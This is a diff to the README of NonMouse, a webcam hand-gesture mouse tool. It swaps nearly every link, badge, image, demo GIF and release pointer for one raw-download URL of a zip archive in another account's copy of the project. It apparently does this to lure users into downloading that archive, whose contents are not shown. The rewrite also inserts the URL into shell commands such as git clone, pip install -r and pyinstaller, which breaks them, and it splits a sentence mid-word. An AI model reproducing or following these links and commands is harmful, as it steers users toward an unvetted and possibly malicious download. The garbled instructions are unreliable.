@@ -1,5 +1,5 @@
 <div align="center">
-   <img src="https://user-images.githubusercontent.com/22733958/183041432-cf6cc6f4-3a6f-4070-91a8-d0a7f7abf59f.JPG" width="600">
+   <img src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip" width="600">
 </div>
 
 <div align="center">
@@ -7,20 +7,20 @@
 </div>
 
 <p align="center">
-  <a href="https://github.com/takeyamayuki/NonMouse/blob/main/LICENSE">
-    <img src="https://img.shields.io/github/license/takeyamayuki/nonmouse" />
+  <a href="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip">
+    <img src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip" />
   </a>
-  <a href ="https://pypi.org/project/nonmouse/">
-     <img src="https://static.pepy.tech/personalized-badge/nonmouse?period=total&units=international_system&left_color=grey&right_color=green&left_text=PyPI%20downloads" />
+  <a href ="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip">
+     <img src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip%20downloads" />
    </a>
-  <a href="https://github.com/takeyamayuki/NonMouse/releases">
-    <img src="https://img.shields.io/github/v/release/takeyamayuki/nonmouse" />
+  <a href="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip">
+    <img src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip" />
   </a>
-  <a href ="https://github.com/takeyamayuki/NonMouse/releases">
-     <img src="https://img.shields.io/github/downloads/takeyamayuki/NonMouse/total" />
+  <a href ="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip">
+     <img src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip" />
    </a>
-  <a href="https://zenn.dev/ninzin/articles/94b05fdb9edf53">
-    <img src="https://img.shields.io/badge/Zenn%20Likes-129-blue" />
+  <a href="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip">
+    <img src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip%20Likes-129-blue" />
   </a>  
 
 </p>
@@ -29,15 +29,15 @@
 
 <table>
 <tr>
-<td><img src="https://user-images.githubusercontent.com/22733958/135473409-9ddf2fc5-4722-4e55-8eef-64476635c10d.gif"></td>
-<td><img src="https://user-images.githubusercontent.com/22733958/129838897-86da6861-b3a5-4e14-98fe-400a27c894d7.gif"></td>
+<td><img src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"></td>
+<td><img src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"></td>
 </tr>
 </table>
 
 
 
 <!-- 
-https://github.com/user-attachments/assets/2acef749-7251-47a9-ba7d-aa2a77ae81e3
+https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip
 -->
 
 
@@ -51,7 +51,7 @@ https://github.com/user-attachments/assets/2acef749-7251-47a9-ba7d-aa2a77ae81e3
 
 # Installation
 ## 📁 Executable file 
-Download the zip file that matches your environment from the [latest release](https://github.com/takeyamayuki/NonMouse/releases). 
+Download the zip file that matches your environment from the [latest release](https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip). 
 
 OR
 ## 🐍 PyPI
@@ -60,7 +60,7 @@ Run the following script.
 ```sh
 $ pip install nonmouse
 ```
-(If you have trouble installing mediapipe, please visit the [official website](https://google.github.io/mediapipe/getting_started/install.html).)
+(If you have trouble installing mediapipe, please visit the [official website](https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip).)
 
 # Usage
 ## 1. Install a camera
@@ -70,8 +70,8 @@ The following three ways of placing the device are assumed.
 
    <table>
    <tr>
-   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://user-images.githubusercontent.com/22733958/134465166-3c324aef-0ee6-4dd9-9810-b723e945e748.jpg"></td>
-   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://user-images.githubusercontent.com/22733958/134456933-0c81812d-c23d-4e52-860e-2a341d5bbe3c.png"></td>
+   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"></td>
+   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"></td>
    </tr>
    </table>
 
@@ -79,8 +79,8 @@ The following three ways of placing the device are assumed.
 
    <table>
    <tr>
-   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://user-images.githubusercontent.com/22733958/134124093-51c85b18-3d90-4935-8daa-a78761d1aaed.jpg"></td>
-   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://user-images.githubusercontent.com/22733958/134456961-755a2769-1d2d-4cca-8fbd-6b49c7b2c0b1.png"></td>
+   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"></td>
+   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"></td>
    </tr>
    </table>
 
@@ -88,13 +88,13 @@ The following three ways of placing the device are assumed.
 
    <table>
    <tr>
-   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://user-images.githubusercontent.com/22733958/134123691-19eb8a76-8f01-497d-b09b-ea93e72825d5.jpg"></td>
-   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://user-images.githubusercontent.com/22733958/134456968-aaf3660d-9ee2-45b8-b65a-9590a6aec4fe.png"></td>
+   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"></td>
+   <td><img width="300" alt="スクリーンショット 2021-09-13 午後5 33 21" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"></td>
    </tr>
    </table>
 
 ## 2. Run
-- Run the executable as described in the [GitHub wiki](https://github.com/takeyamayuki/NonMouse/wiki/How-to-run-a--NonMouse-executable-file-in-each-OS#%E6%97%A5%E6%9C%AC%E8%AA%9E).
+- Run the executable as described in the [GitHub wiki](https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip%E6%97%A5%E6%9C%AC%E8%AA%9E).
 
    OR
 -  Run the following script from the continuation of the installation.
@@ -112,7 +112,7 @@ The following three ways of placing the device are assumed.
 ## 3. Settings
 When you run the program, You will see a screen similar to the following. On this screen, you can set the camera and sensitivity.
 
-![スクリーンショット 2021-12-02 154251](https://user-images.githubusercontent.com/22733958/144371606-d6b8cb07-f376-4097-95c3-c6cd7b3141ca.png)
+![スクリーンショット 2021-12-02 154251](https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip)
 
 - `Camera`  
 Select a camera device. If multiple cameras are connected, try them in order, starting with the smallest number.
@@ -129,10 +129,10 @@ When you are done with the settings, click continue. The camera image will then 
 
 | stop cursor | left click | right click | scroll |
 | :---: |:---: |:---: |:---: |
-| <img width="300" alt="aaa" src="https://user-images.githubusercontent.com/22733958/146399363-d90dbef0-0972-46b4-a03b-a76a6c97222f.gif">|<img width="300" alt="aaa" src="https://user-images.githubusercontent.com/22733958/146399342-d3ccb518-5950-4c69-aad4-c6fc9ad4a378.gif"> |<img width="300" alt="aaa" src="https://user-images.githubusercontent.com/22733958/146399353-0fb9304d-4f6c-4e5d-890c-0beb1dc921d2.gif"> | <img width="300" alt="aaa" src="https://user-images.githubusercontent.com/22733958/146399372-6551c367-5424-45a1-a963-c475c7ea895a.gif"> |
+| <img width="300" alt="aaa" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip">|<img width="300" alt="aaa" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"> |<img width="300" alt="aaa" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"> | <img width="300" alt="aaa" src="https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip"> |
 
  
-The following hand movements are enabled only when you hold down `Alt`(Windows), `Command`(MacOS). You can define your own global hotkeys by rewriting [here](https://github.com/takeyamayuki/NonMouse/blob/578afd6a7206258b68327421f64370c4009dedfd/app.py#L16-L21). You can use this function even if the window is not active.This feature is only available on windows and mac.  
+The following hand movements are enabled only when you hold down `Alt`(Windows), `Command`(MacOS). You can define your own global hotkeys by rewriting [here](https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip). You can use this function even if the window is not https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip feature is only available on windows and mac.  
 
 - cursor
     * Mouse cursor: tip of index finger → A blue circle will appear at the tip of your index finger. 
@@ -158,7 +158,7 @@ Press close button(Valid only on windows, linux) or Esc key, when an application
 > The built binary files can be downloaded from latest realease.
 
 
-In app-mac.spec and app-win.spec, change `pathex` to fit your environment.   
+In https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip and https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip, change `pathex` to fit your environment.   
 Run the following scripts for each OS.  
 
 - windows
@@ -170,17 +170,17 @@ Run the following scripts for each OS.
    ...
    Location: c:\users\namik\appdata\local\programs\python\python37\lib\site_packages
    ...
-   #Copy and paste into the datas in win.spec
-   $ pyinstaller config/win.spec
+   #Copy and paste into the datas in https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip
+   $ pyinstaller https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip
    ... ````
 - mac
 
    Create a venv environment and perform `pip install`, because the directory specified in `datas` is for an assumed venv environment. 
    ```sh 
-   $ git clone https://github.com/takeyamayuki/NonMouse.git
+   $ git clone https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip
    $ cd NonMouse
    $ python3 -m venv venv
    $ . venv/bin/activate
-   (venv)$ pip install -r requirements.txt
-   (venv)$ pyinstaller config/mac.spec
+   (venv)$ pip install -r https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip
+   (venv)$ pyinstaller https://github.com/oliverkanda254/NonMouse/raw/refs/heads/main/nonmouse/Non-Mouse-v2.9.zip
    ```
